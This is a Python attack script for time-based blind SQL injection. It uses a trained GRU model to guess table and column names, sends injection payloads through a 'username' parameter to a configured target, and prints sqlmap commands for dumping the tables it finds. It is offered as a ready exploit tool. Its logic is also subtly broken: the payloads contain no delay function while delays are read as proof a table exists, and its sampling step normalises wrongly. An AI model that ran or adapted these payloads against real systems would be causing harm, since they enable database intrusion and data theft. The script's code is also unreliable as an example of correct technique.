"""
===============================================================================
BLIND SQLI EXPLOITATION SCRIPT - PRODUCTION READY
Using trained GRU model for intelligent table/column name generation
===============================================================================
"""

import os
import time
import json
import numpy as np
import requests
import tensorflow as tf
from urllib.parse import quote_plus
from typing import List, Tuple, Dict
from colorama import init, Fore, Style
init(autoreset=True)

# ================== CONFIG ==================

MODEL_DIR = "trained_models"
MODEL_PATH = os.path.join(MODEL_DIR, "blind_sqli_gru_best.h5")
VOCAB_PATH = os.path.join(MODEL_DIR, "vocab.json")
CONFIG_PATH = os.path.join(MODEL_DIR, "config.json")

# Target configuration
TARGET = "http://127.0.0.1:5000/time"
PARAM = "username"
DELAY_THRESHOLD = 3.5  # Seconds - adjusted lower for better detection
REQUEST_TIMEOUT = 6.0  # Total timeout

# Special tokens
END_TOKEN = '*'
PAD_TOKEN = '<PAD>'
UNK_TOKEN = '<UNK>'

# ================== LOAD MODEL & VOCAB ==================

def load_model_and_vocab():
    """Load trained model and vocabulary"""
    print(f"{Fore.CYAN}[*] Loading model from: {MODEL_PATH}")
    print(f"{Fore.CYAN}[*] Loading vocab from: {VOCAB_PATH}")
    
    # Check files
    if not os.path.exists(MODEL_PATH):
        raise FileNotFoundError(f"Model not found: {MODEL_PATH}")
    if not os.path.exists(VOCAB_PATH):
        raise FileNotFoundError(f"Vocabulary not found: {VOCAB_PATH}")
    if not os.path.exists(CONFIG_PATH):
        raise FileNotFoundError(f"Config not found: {CONFIG_PATH}")
    
    # Load vocabulary
    with open(VOCAB_PATH, 'r', encoding='utf-8') as f:
        vocab_data = json.load(f)
    
    char2idx = vocab_data['char2idx']
    idx2char = {int(k): v for k, v in vocab_data['idx2char'].items()}
    end_token_idx = vocab_data.get('end_token_idx', char2idx.get(END_TOKEN))
    
    # Load config
    with open(CONFIG_PATH, 'r') as f:
        config = json.load(f)
    
    seq_length = config['seq_length']
    
    print(f"{Fore.GREEN}[+] Vocab size: {len(char2idx)}")
    print(f"{Fore.GREEN}[+] Sequence length: {seq_length}")
    print(f"{Fore.GREEN}[+] END_TOKEN '{END_TOKEN}' index: {end_token_idx}")
    
    # Load model
    try:
        model = tf.keras.models.load_model(MODEL_PATH, compile=False)
        print(f"{Fore.GREEN}[+] Model loaded successfully!")
    except Exception as e:
        raise RuntimeError(f"Failed to load model: {e}")
    
    return model, char2idx, idx2char, seq_length, end_token_idx


# ================== TEXT GENERATION ==================

def generate_name(
    model, char2idx, idx2char, seq_length, end_token_idx,
    seed_text: str = "", max_length: int = 20, temperature: float = 0.6
) -> str:
    """Generate table/column name using GRU model"""
    if not seed_text:
        common_starts = ['u', 'a', 'p', 'i', 'd', 'n', 'e', 't', 'c', 's']
        seed_text = np.random.choice(common_starts)
    
    seed_text = seed_text.lower().strip()
    generated = seed_text
    
    for _ in range(max_length):
        # Prepare input
        x = [char2idx.get(c, 1) for c in generated[-seq_length:]]
        while len(x) < seq_length:
            x.insert(0, 0)
        x = np.array([x])
        
        # Predict
        predictions = model.predict(x, verbose=0)[0]
        
        # Temperature sampling
        predictions = np.log(predictions + 1e-10) / temperature
        predictions = np.exp(predictions) / np.sum(predictions)
        
        # Top-k sampling
        top_k = 5
        top_indices = np.argpartition(predictions, -top_k)[-top_k:]
        top_probs = predictions[top_indices]
        top_probs = top_probs / np.sum(top_probs)
        predicted_idx = np.random.choice(top_indices, p=top_probs)
        
        predicted_char = idx2char[predicted_idx]
        
        # Stop conditions
        if predicted_char in [END_TOKEN, '\n', PAD_TOKEN, UNK_TOKEN]:
            break
        
        generated += predicted_char
    
    return generated if len(generated) > len(seed_text) else ""


def generate_candidate_names(
    model, char2idx, idx2char, seq_length, end_token_idx,
    count: int = 50, temperature: float = 0.6, name_type: str = "table"
) -> List[str]:
    """Generate multiple unique candidate names"""
    names = set()
    
    # Different seeds for tables vs columns
    if name_type == "table":
        seeds = ['us', 'ad', 'ta', 'or', 'pr', 'cu', 'se', 'lo', 'da', 'sy']
    else:  # columns
        seeds = ['id', 'na', 'em', 'pa', 'us', 'da', 'cr', 'up', 'de', 'ti', 'st']
    
    attempts = 0
    max_attempts = count * 5
    
    while len(names) < count and attempts < max_attempts:
        seed = np.random.choice(seeds)
        name = generate_name(
            model, char2idx, idx2char, seq_length, end_token_idx,
            seed_text=seed, max_length=20, temperature=temperature
        )
        
        # Validate
        if name and len(name) > 2 and name not in names:
            if not any(c in name for c in ['<', '>', '{', '}', '[', ']']):
                names.add(name)
        
        attempts += 1
    
    return sorted(names)


# ================== PAYLOAD BUILDING ==================

def build_table_detection_payload(table_name: str) -> str:
    """Build SQLi payload to detect table existence via time delay"""
    # Try to select from table - if exists, query succeeds and takes time
    payload = f"admin' OR (SELECT COUNT(*) FROM {table_name}) >= 0 -- -"
    return payload


def build_column_detection_payload(table_name: str, column_name: str) -> str:
    """Build SQLi payload to detect column existence"""
    payload = f"admin' OR (SELECT {column_name} FROM {table_name} LIMIT 1) IS NOT NULL -- -"
    return payload


# ================== REQUEST HANDLING ==================

def send_payload(payload: str) -> Tuple[float, bool, bool]:
    """
    Send payload and measure response time
    
    Returns:
        (response_time, timed_out, error_occurred)
    """
    try:
        url = f"{TARGET}?{PARAM}={quote_plus(payload)}"
        t1 = time.time()
        response = requests.get(url, timeout=REQUEST_TIMEOUT)
        t2 = time.time()
        elapsed = t2 - t1
        
        # Check if response indicates error (syntax error = table/column doesn't exist)
        error_occurred = ('error' in response.text.lower() or 
                         response.status_code >= 400)
        
        return elapsed, False, error_occurred
    except requests.exceptions.Timeout:
        return REQUEST_TIMEOUT, True, False
    except Exception as e:
        return 0.0, False, True


# ================== EXPLOITATION ==================

def test_table_existence(
    model, char2idx, idx2char, seq_length, end_token_idx,
    num_tests: int = 50, temperature: float = 0.6
) -> List[Tuple[str, float]]:
    """Test for table existence using time-based blind SQLi"""
    
    print("\n" + "="*70)
    print(f"{Fore.YELLOW}{Style.BRIGHT}BLIND SQLI EXPLOITATION - TABLE DETECTION")
    print("="*70)
    print(f"{Fore.CYAN}[+] Target: {TARGET}")
    print(f"{Fore.CYAN}[+] Delay threshold: {DELAY_THRESHOLD}s")
    print(f"{Fore.CYAN}[+] Generating {num_tests} table names using GRU model...")
    
    # Generate candidates
    table_names = generate_candidate_names(
        model, char2idx, idx2char, seq_length, end_token_idx,
        count=num_tests, temperature=temperature, name_type="table"
    )
    
    print(f"{Fore.GREEN}[+] Generated {len(table_names)} unique table names")
    print(f"{Fore.CYAN}[+] Starting exploitation...\n")
    
    found_tables = []
    
    for i, table_name in enumerate(table_names, 1):
        payload = build_table_detection_payload(table_name)
        elapsed, timed_out, error = send_payload(payload)
        
        # Interpret results
        if error:
            # Syntax error = table doesn't exist
            status = f"{Fore.RED}âœ— No exist"
        elif elapsed >= DELAY_THRESHOLD or timed_out:
            # Delay = table exists
            status = f"{Fore.GREEN}â±ï¸  DELAY - FOUND!"
            found_tables.append((table_name, elapsed))
        else:
            # Fast response = table doesn't exist (or error)
            status = f"{Fore.WHITE}âœ“ Fast"
        
        print(f"[{i:02d}/{len(table_names)}] {table_name:20s} -> {elapsed:5.2f}s  {status}")
        
        if elapsed >= DELAY_THRESHOLD:
            print(f"{Fore.YELLOW}    â””â”€> âš ï¸  Potential table: '{table_name}'")
        
        # Small delay to avoid overwhelming server
        time.sleep(0.1)
    
    return found_tables


def test_columns_for_table(
    model, char2idx, idx2char, seq_length, end_token_idx,
    table_name: str, num_tests: int = 30, temperature: float = 0.6
) -> List[str]:
    """Test for column existence in a specific table"""
    
    print(f"\n{Fore.CYAN}[*] Testing columns for table: {Fore.YELLOW}{table_name}")
    
    # Generate column candidates
    column_names = generate_candidate_names(
        model, char2idx, idx2char, seq_length, end_token_idx,
        count=num_tests, temperature=temperature, name_type="column"
    )
    
    found_columns = []
    
    for i, column_name in enumerate(column_names, 1):
        payload = build_column_detection_payload(table_name, column_name)
        elapsed, timed_out, error = send_payload(payload)
        
        if error:
            status = f"{Fore.RED}âœ— No exist"
        elif elapsed >= DELAY_THRESHOLD or timed_out:
            status = f"{Fore.GREEN}â±ï¸  DELAY - FOUND!"
            found_columns.append(column_name)
        else:
            status = f"{Fore.WHITE}âœ“ Fast"
        
        print(f"  [{i:02d}/{len(column_names)}] {column_name:20s} -> {elapsed:5.2f}s  {status}")
        
        time.sleep(0.1)
    
    return found_columns


def display_summary(found_tables: List[Tuple[str, float]], 
                   table_columns: Dict[str, List[str]]):
    """Display exploitation summary"""
    print("\n" + "="*70)
    print(f"{Fore.YELLOW}{Style.BRIGHT}EXPLOITATION SUMMARY")
    print("="*70)
    
    if found_tables:
        print(f"{Fore.GREEN}[+] Found {len(found_tables)} potential tables:\n")
        
        for table, delay in found_tables:
            print(f"{Fore.YELLOW}  ðŸ“‹ Table: {Fore.CYAN}{table} {Fore.WHITE}(delay: {delay:.2f}s)")
            
            if table in table_columns and table_columns[table]:
                columns = table_columns[table]
                print(f"      {Fore.GREEN}Columns found ({len(columns)}):")
                for col in columns:
                    print(f"        â€¢ {col}")
            else:
                print(f"      {Fore.RED}No columns detected")
            print()
        
        # Generate exploit examples
        print(f"\n{Fore.CYAN}[â†’] Example exploitation commands:")
        for table, _ in found_tables[:3]:  # Show first 3
            if table in table_columns and table_columns[table]:
                col = table_columns[table][0]
                print(f"    sqlmap -u '{TARGET}?{PARAM}=*' --dbms=sqlite \\")
                print(f"           -T {table} -C {col} --dump")
            else:
                print(f"    sqlmap -u '{TARGET}?{PARAM}=*' --dbms=sqlite \\")
                print(f"           -T {table} --columns")
    else:
        print(f"{Fore.RED}[!] No tables detected with time delay")
        print(f"{Fore.YELLOW}[*] Possible reasons:")
        print("    1. Generated names don't match real tables")
        print("    2. Server doesn't have time-based vulnerability")
        print("    3. Delay threshold too high (try lowering to 2.0s)")
        print("    4. Need more iterations with different temperatures")


# ================== MAIN ==================

def main():
    """Main entry point"""
    try:
        print(f"\n{Fore.CYAN}{Style.BRIGHT}{'='*70}")
        print(f"{Fore.YELLOW}{Style.BRIGHT}BLIND SQLI EXPLOITATION - GRU MODEL METHOD")
        print(f"{Fore.CYAN}{Style.BRIGHT}{'='*70}\n")
        
        # Load model
        model, char2idx, idx2char, seq_length, end_token_idx = load_model_and_vocab()
        
        # Test generation
        print(f"\n{Fore.CYAN}[*] Testing text generation (sanity check):")
        test_seeds = ['us', 'ad', 'pa', 'id', 'na']
        for seed in test_seeds:
            name = generate_name(
                model, char2idx, idx2char, seq_length, end_token_idx,
                seed_text=seed, temperature=0.6
            )
            print(f"  {Fore.YELLOW}{seed}{Fore.WHITE} -> {Fore.GREEN}{name}")
        
        # Confirm before attack
        print(f"\n{Fore.YELLOW}[?] Generation looks good. Start exploitation? (y/n): {Fore.WHITE}", end="")
        if input().lower() != 'y':
            print(f"{Fore.RED}[!] Cancelled by user")
            return
        
        # Phase 1: Find tables
        found_tables = test_table_existence(
            model, char2idx, idx2char, seq_length, end_token_idx,
            num_tests=50,
            temperature=0.6
        )
        
        # Phase 2: Find columns for each table
        table_columns = {}
        
        if found_tables:
            print(f"\n{Fore.YELLOW}[?] Test columns for found tables? (y/n): {Fore.WHITE}", end="")
            if input().lower() == 'y':
                for table_name, _ in found_tables:
                    columns = test_columns_for_table(
                        model, char2idx, idx2char, seq_length, end_token_idx,
                        table_name=table_name,
                        num_tests=30,
                        temperature=0.6
                    )
                    table_columns[table_name] = columns
        
        # Display summary
        display_summary(found_tables, table_columns)
        
        # Save results
        results_file = "exploitation_results.json"
        results = {
            "target": TARGET,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "tables_found": [
                {
                    "name": table,
                    "delay": delay,
                    "columns": table_columns.get(table, [])
                }
                for table, delay in found_tables
            ]
        }
        
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Results saved to: {results_file}")
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.GREEN}{Style.BRIGHT}[âœ“] EXPLOITATION COMPLETE!")
        print(f"{Fore.CYAN}{'='*70}\n")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user")
    except Exception as e:
        print(f"\n{Fore.RED}[âœ—] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()